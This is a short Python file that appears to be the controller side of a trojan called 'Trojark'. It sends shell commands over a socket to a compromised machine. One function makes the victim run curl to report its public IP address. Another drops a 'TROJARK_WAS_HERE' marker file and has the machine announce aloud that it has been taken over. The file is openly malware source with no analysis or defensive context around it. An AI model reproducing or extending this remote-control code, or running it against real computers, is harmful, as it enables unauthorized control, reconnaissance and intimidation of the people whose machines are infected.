import socket


def send_command(clientsocket: socket.socket, cmd: str):
    clientsocket.send(bytes(cmd, "utf-8"))


def ip(clientsocket: socket.socket, address: tuple):
    send_command(clientsocket, 'curl "https://api.ipify.org"')


def scare(clientsocket: socket.socket, address: tuple):
    send_command(clientsocket, 'echo "" > TROJARK_WAS_HERE')
    send_command(clientsocket, "say Trojark has taken over your computer.")
